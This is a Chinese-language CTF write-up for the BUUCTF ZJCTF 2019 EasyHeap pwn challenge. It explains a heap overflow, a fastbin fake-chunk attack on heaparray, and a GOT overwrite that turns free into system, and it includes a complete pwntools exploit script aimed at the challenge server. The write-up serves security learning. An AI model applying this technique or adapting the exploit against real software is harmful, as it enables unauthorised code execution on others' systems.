---
title: BUUCTF-ZJCTF-2019-EasyHeap 题解
date: 2026-01-13 23:47:00
tags: 
    - heap
    - 堆溢出
    - fastbin attack
    - pwn
    - BUUCTF
categories: pwn 题解
---
### 题目

[题目链接](https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-EasyHeap/checksec.png)

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-EasyHeap/main.png)

菜单题

#### menu

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-EasyHeap/menu.png)

#### create

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-EasyHeap/create.png)

#### delete

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-EasyHeap/delete.png)

#### edit

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-EasyHeap/edit.png)

有明显的堆溢出，考虑通过 fastbin 获取在 heaparray 附近的 fake chunk ，再劫持 heaparray 以实现任意地址写

#### got

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-EasyHeap/got.png)

#### systemplt

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-EasyHeap/systemplt.png)

### 构造合适位置的 fake chunk

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-EasyHeap/ex1.png)

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-EasyHeap/ex2.png)

0x6020ad 处有满足 size = 0x7f 的 fake chunk ，故申请 0x68 字节，使用 0x70 的 fastbin 链表

### 攻击思路

先利用堆溢出漏洞劫持已进入 fastbin 的 chunk 的 fd 指针为 fake chunk 地址 0x6020ad

再通过 malloc 申请这块 fake chunk ，同时在 fake chunk 写入 payload 劫持 heaparray[0]

由于我们希望通过 system("/bin/sh") 提权，然而 elf 中并没有 "/bin/sh" 字符串，这需要我们手动写入

更坏的是，我们似乎并没有操纵栈的机会，只能通过劫持 got 表短暂地劫持程序流程，，，

所以这里有一个巧妙的方法：注意到 system 的参数为 rdi ，所以我们可以把 free 劫持为 system_plt ，由于 free 的参数是我们自己可以设定的，通过在某个索引为 idx 的 chunk 上写入 "/bin/sh\x00" ，调用 delete_heap(idx) 后即可执行 system("/bin/sh") 提权

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:
	p = process('./easyheap')
else:
	p = remote('node5.buuoj.cn', 26200)

def pcreate(size, content):
	p.recvuntil(b'choice :')
	p.sendline(b'1')
	p.recvuntil(b'Heap : ')
	p.sendline(str(size).encode())
	p.recvuntil(b'heap:')
	p.sendline(content)
	
def pedit(index, size, content):
	p.recvuntil(b'choice :')
	p.sendline(b'2')
	p.recvuntil(b'Index :')
	p.sendline(str(index).encode())
	p.recvuntil(b'Heap : ')
	p.sendline(str(size).encode())
	p.recvuntil(b'heap : ')
	p.sendline(content)
	
def pdelete(index):
	p.recvuntil(b'choice :')
	p.sendline(b'3')
	p.recvuntil(b'Index :')
	p.sendline(str(index).encode())

def attack():
	pcreate(0x68, b'')
	pcreate(0x68, b'')
	pcreate(0x68, b'')
	pdelete(2)

	payload = b'A' * 0x68 + p64(0x7f) + p64(0x6020ad)
	pedit(1, len(payload), payload)

	pcreate(0x68, b'')
	payload = b'A' * 35 + p64(0x602018)
	pcreate(0x68, payload)

	payload = p64(0x400700)
	pedit(0, len(payload), payload)

	payload = b'/bin/sh\x00'
	pedit(1, len(payload), payload)

	pdelete(1)

	p.interactive()

attack()
```